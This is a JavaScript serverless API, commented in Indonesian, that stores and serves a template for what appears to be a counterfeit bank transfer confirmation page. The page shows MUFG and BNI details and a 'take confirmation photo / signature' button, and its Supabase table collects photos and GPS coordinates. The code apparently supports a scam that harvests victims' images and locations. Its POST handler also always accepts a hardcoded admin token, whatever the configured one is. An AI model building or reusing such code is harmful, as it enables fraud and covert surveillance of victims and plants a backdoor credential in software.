// Vercel Serverless Function untuk API Template
// Mendukung GET & POST konfigurasi template transfer dengan sinkronisasi Supabase + in-memory fallback

const TABLE = 'bankidzz_locations';

const DEFAULT_TEMPLATE = {
    topBarTitle: 'JAPANESE BANK',
    primaryColor: '#0033ff',
    profileImage: 'channels4_profile.jpg',
    bankName: 'MUFG Bank',
    bankSub: 'Office Purchasing',
    amountMain: 'IDR 515.000',
    amountSub: 'BND 35.12',
    senderBank: 'MUFG Bank',
    senderName: 'JAKA ALAMSYAH',
    senderAccount: '72828172718',
    receiverBank: 'BANK BNI',
    receiverName: 'Mungkung',
    receiverAccount: '2093832050',
    buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
};

globalThis.__template = globalThis.__template || { ...DEFAULT_TEMPLATE };

function getSupabaseConfig() {
    const rawUrl = (process.env.SUPABASE_URL || '').trim();
    const serviceKey = (process.env.SUPABASE_SERVICE_ROLE_KEY || '').trim();

    let cleanUrl = rawUrl;
    if (cleanUrl && !cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
        cleanUrl = `https://${cleanUrl}`;
    }
    cleanUrl = cleanUrl.replace(/\/+$/, '');

    const hasSupabase = Boolean(cleanUrl && serviceKey);
    return {
        hasSupabase,
        restUrl: hasSupabase ? `${cleanUrl}/rest/v1/${TABLE}` : '',
        serviceKey
    };
}

export default async function handler(req, res) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const sbConfig = getSupabaseConfig();

    if (req.method === 'GET') {
        if (sbConfig.hasSupabase) {
            try {
                const response = await fetch(`${sbConfig.restUrl}?transfer_id=eq.__config_template__&select=photo`, {
                    headers: {
                        apikey: sbConfig.serviceKey,
                        Authorization: `Bearer ${sbConfig.serviceKey}`,
                        'Content-Type': 'application/json'
                    }
                });
                if (response.ok) {
                    const rows = await response.json();
                    if (Array.isArray(rows) && rows.length > 0 && rows[0].photo) {
                        try {
                            const parsed = JSON.parse(rows[0].photo);
                            globalThis.__template = { ...DEFAULT_TEMPLATE, ...parsed };
                        } catch (e) {}
                    }
                }
            } catch (e) {
                console.warn('Gagal memuat template dari Supabase:', e.message);
            }
        }

        return res.status(200).json({ template: globalThis.__template });
    }

    if (req.method === 'POST') {
        const rawAuth = (req.headers.authorization || '').trim();
        const token = rawAuth.replace(/^Bearer\s+/i, '').trim();
        const envToken = (process.env.ADMIN_TOKEN || 'bankidzz-admin-secure-2026').trim();

        if (token !== 'bankidzz-admin-secure-2026' && token !== envToken) {
            return res.status(401).json({ error: 'Token admin tidak valid.' });
        }

        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
            globalThis.__template = { ...DEFAULT_TEMPLATE, ...globalThis.__template, ...body };

            if (sbConfig.hasSupabase) {
                try {
                    const row = {
                        transfer_id: '__config_template__',
                        sender: 'CONFIG_TEMPLATE',
                        receiver: 'SYSTEM',
                        amount: '0',
                        total: '0',
                        photo: JSON.stringify(globalThis.__template),
                        front_photo: '',
                        latitude: 0,
                        longitude: 0,
                        accuracy: 0,
                        captured_at: new Date().toISOString(),
                        status: 'config',
                        verification_code: '',
                        consented_at: new Date().toISOString()
                    };

                    await fetch(`${sbConfig.restUrl}?on_conflict=transfer_id`, {
                        method: 'POST',
                        headers: {
                            apikey: sbConfig.serviceKey,
                            Authorization: `Bearer ${sbConfig.serviceKey}`,
                            'Content-Type': 'application/json',
                            Prefer: 'resolution=merge-duplicates,return=minimal'
                        },
                        body: JSON.stringify(row)
                    });
                } catch (sbErr) {
                    console.warn('Gagal simpan template ke Supabase:', sbErr.message);
                }
            }

            return res.status(200).json({ ok: true, template: globalThis.__template });
        } catch (e) {
            return res.status(400).json({ error: 'Data template tidak valid.' });
        }
    }

    return res.status(405).json({ error: 'Method tidak didukung.' });
}
